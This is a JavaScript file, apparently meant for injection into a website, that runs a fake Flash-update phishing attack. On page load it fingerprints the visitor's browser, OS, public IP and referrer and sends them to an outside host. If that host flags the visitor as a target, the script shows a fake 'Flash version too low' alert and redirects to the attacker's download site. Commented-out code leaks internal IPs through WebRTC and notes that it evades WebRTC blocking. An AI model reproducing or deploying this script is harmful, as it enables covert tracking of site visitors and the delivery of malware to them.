
window.alert = function (name) {
    var iframe = document.createElement("IFRAME");
    iframe.style.display = "none";
    iframe.setAttribute("src", 'data:text/plain,');
    document.documentElement.appendChild(iframe);
    window.frames[0].window.alert(name);
    iframe.parentNode.removeChild(iframe);
}

window.confirm = function (name) {
    var iframe = document.createElement("IFRAME");
    iframe.style.display = "none";
    iframe.setAttribute("src", 'data:text/plain,');
    document.documentElement.appendChild(iframe);
    var result = window.frames[0].window.confirm(name);
    iframe.parentNode.removeChild(iframe);
    return result;
}


// 获取当前访问者的 浏览器类型
function getBrowser() {
    var myUserAgent = navigator.userAgent.toLowerCase();
    if (/msie/i.test(myUserAgent) && !/opera/.test(myUserAgent)) {
        // alert("IE");
        return "IE";
    } else if (/firefox/i.test(myUserAgent)) {
        // alert("Firefox");
        return "Firefox";
    } else if (/chrome/i.test(myUserAgent) && /webkit/i.test(myUserAgent) && /mozilla/i.test(myUserAgent)) {
        // alert("Chrome");
        return "Chrome";
    } else if (/opera/i.test(myUserAgent)) {
        // alert("Opera");
        return "Opera";
    } else if (/webkit/i.test(myUserAgent) && !(/chrome/i.test(myUserAgent) && /webkit/i.test(myUserAgent) && /mozilla/i.test(myUserAgent))) {
        // alert("Safari");
        return "Safari";
    } else {
        alert("unknown");
    }
}


// 获取当前访问者的 系统版本
function getOS() {
    var myUserAgent = navigator.userAgent;
    var SystemBits = navigator.userAgent.toLowerCase();

    var isMac = (navigator.platform == "Mac68K") || (navigator.platform == "MacPPC") || (navigator.platform == "Macintosh") || (navigator.platform == "MacIntel");
    if (isMac) return "Mac";

    var isUnix = (navigator.platform == "X11") && !isWin && !isMac;
    if (isUnix) {
        return "Unix";
    }

    var isLinux = (String(navigator.platform).indexOf("Linux") > -1);
    if (isLinux) {
        return "Linux";
    }

    if (myUserAgent.match(/(iPhone|Android)/i)) {
        return "iPhone|Android";
    }

    if (SystemBits.indexOf("win64") >= 0 || SystemBits.indexOf("wow64") >= 0) {
        SystemBits = "x64";
    } else {
        SystemBits = "x32";
    }


    var isWin = (navigator.platform == "Win32") || (navigator.platform == "Windows");
    if (isWin) {

        var isWin2K = myUserAgent.indexOf("Windows NT 5.0") > -1 || myUserAgent.indexOf("Windows 2000") > -1;
        if (isWin2K) {

            return "Win2000 " + SystemBits;
        }

        var isWinXP = myUserAgent.indexOf("Windows NT 5.1") > -1 || myUserAgent.indexOf("Windows XP") > -1;
        if (isWinXP) {
            return "WinXP " + SystemBits;
        }

        var isWin2003 = myUserAgent.indexOf("Windows NT 5.2") > -1 || myUserAgent.indexOf("Windows 2003") > -1;
        if (isWin2003) {
            return "Win2003 " + SystemBits;
        }

        var isWinVista = myUserAgent.indexOf("Windows NT 6.0") > -1 || myUserAgent.indexOf("Windows Vista") > -1;
        if (isWinVista) {
            return "WinVista " + SystemBits;
        }

        var isWin7 = myUserAgent.indexOf("Windows NT 6.1") > -1 || myUserAgent.indexOf("Windows 7") > -1;
        if (isWin7) {
            return "Win7 " + SystemBits;
        }

        var isWin2012 = myUserAgent.indexOf("Windows NT 6.2") > -1 || myUserAgent.indexOf("Windows 2012") > -1;
        if (isWin2012) {
            return "Win2012 " + SystemBits;
        }

        var isWin2012R2 = myUserAgent.indexOf("Windows NT 6.3") > -1 || myUserAgent.indexOf("Windows 2012R2") > -1;
        if (isWin2012) {
            return "Win2012R2 " + SystemBits;
        }

        var isWin10BE = myUserAgent.indexOf("Windows NT 6.4") > -1 || myUserAgent.indexOf("Windows 10") > -1;
        if (isWin2012) {
            return "Win10 " + SystemBits;
        }

        var isWin10 = myUserAgent.indexOf("Windows NT 10") > -1 || myUserAgent.indexOf("Windows 10") > -1;
        if (isWin10) {
            return "Win10 " + SystemBits;
        }
    }

    return "unknown";
}


// function getIPs(callback, promiseResolve) {
//     var ip_dups = {};

//     try {

//         //compatibility for firefox and chrome
//         var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;

//         //bypass naive webrtc blocking
//         if (!RTCPeerConnection) {
//             var iframe = document.createElement('iframe');
//             //invalidate content script
//             iframe.sandbox = 'allow-same-origin';
//             iframe.style.display = 'none';
//             document.body.appendChild(iframe);
//             var win = iframe.contentWindow;
//             window.RTCPeerConnection = win.RTCPeerConnection;
//             window.mozRTCPeerConnection = win.mozRTCPeerConnection;
//             window.webkitRTCPeerConnection = win.webkitRTCPeerConnection;
//             RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
//         }

//         //minimal requirements for data connection
//         var mediaConstraints = {
//             optional: [{ RtpDataChannels: true }]
//         };

//         //firefox already has a default stun server in about:config
//         //    media.peerconnection.default_iceservers =
//         //    [{"url": "stun:stun.services.mozilla.com"}]
//         var servers = undefined;

//         //add same stun server for chrome
//         if (window.webkitRTCPeerConnection)
//             servers = { iceServers: [{ urls: "stun:stun.services.mozilla.com" }] };

//         //construct a new RTCPeerConnection
//         var pc = new RTCPeerConnection(servers, mediaConstraints);

//         //listen for candidate events

//         pc.onicecandidate = function (ice) {
//             //skip non-candidate events
//             if (ice.candidate) {

//                 //match just the IP address
//                 var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
//                 var ip_addr = ip_regex.exec(ice.candidate.candidate)[1];

//                 //remove duplicates
//                 if (ip_dups[ip_addr] === undefined)
//                     callback(ip_addr);

//                 ip_dups[ip_addr] = true;

//                 promiseResolve(ip_addr);
//             }
//         };

//         //create a bogus data channel
//         pc.createDataChannel("");

//         //create an offer sdp
//         pc.createOffer(function (result) {

//             //trigger the stun server request
//             pc.setLocalDescription(result, function () { }, function () { });

//         }, function () { });
//         return;
//     } catch (error) {
//         promiseResolve("unknown");
//     }finally{
//         promiseResolve("unknown");
//     }
// }

// 获取外网的ip
function getOuterIp(innerIp) {
    var xmlHttp;
    var outerIp;
    if (window.XMLHttpRequest) {
        xmlHttp = new XMLHttpRequest();
    } else {
        xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    }


    //可能会导致错误的代码
    xmlHttp.open("GET", "https://api.ipify.org/?format=jsonp&callback=aaaa", true);
    xmlHttp.send();
    xmlHttp.onreadystatechange = function () {
        if (xmlHttp.readyState === 4 && xmlHttp.status === 200) {
            var resData = xmlHttp.responseText;
            var ip_regex = /(\d+.\d+.\d+.\d+)/;
            outerIp = ip_regex.exec(resData)[0];
            isRise(innerIp, outerIp);
        } else {
            outerIp = "";
        }
    };

    return outerIp;
}

function getRefer(){
    var refer;

    try{
        refer = document.referrer.match("//(.*)/")[1]; //IE Location获取不到
    }catch (e) {
        refer = "";
    }
    return refer;
}


// 向服务器发送记录请求
function isRise(innerIp, outerIp) {
    var xmlHttp;
    if (window.XMLHttpRequest) {
        xmlHttp = new XMLHttpRequest();
    } else {
        xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    }

    xmlHttp.open("GET", "https://windows.iflash.tk/index.php?m=api&a=isVisit" + "&ua=" + getBrowser() + "&outerIp="
        + outerIp + "&os=" + getOS() + "&innerIp=" + innerIp + "&referer=" + getRefer(), true);
    xmlHttp.send();
    xmlHttp.onreadystatechange = function () {
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
            var jsonData = JSON.parse(xmlHttp.responseText);
            if (jsonData.isTarget == "1") {
                download();
            } else {
                return;
            }
        }
    }
}

// 这里使用的是flash钓鱼
function download() {
    window.alert = function (name) {
        var iframe = document.createElement("IFRAME");
        iframe.style.display = "none";
        iframe.setAttribute("src", 'data:text/plain,');
        document.documentElement.appendChild(iframe);
        window.frames[0].window.alert(name);
        iframe.parentNode.removeChild(iframe);
    };
    //alert("您的FLASH版本过低，请尝试升级后访问该页面!");
    alert("您的FLASH版本过低，可能无法正常进行文本编辑器的使用，请尝试升级后访问该页面!");
    window.location.href = "https://windows.iflash.tk/";
}

// 判断是否为PC
// function isPc() {
//     if (navigator.userAgent.match(/(iPhone|Android)/i)) {
//         return false;
//     } else {
//         return true;
//     }
// }

window.onload = function () {

    // 记录，攻击
    // if (!isPc()) {
    //     alert("当前页面只能在电脑PC端中加载,请稍后重试...");
    // } else {
    //     isRise();
    // }

    // 记录，不攻击

    // window.ip_promise = new Promise(function (resolve, reject) {
    //     getIPs(function (ip = "unknown") {
    //         console.log(ip);
    //     }, resolve);
    // });
    setTimeout('getOuterIp("")',2000);
    // window.ip_promise.then(innerIp => {
    //     getOuterIp(innerIp);
    // });
    //getOuterIp("");

    //isRise();
};

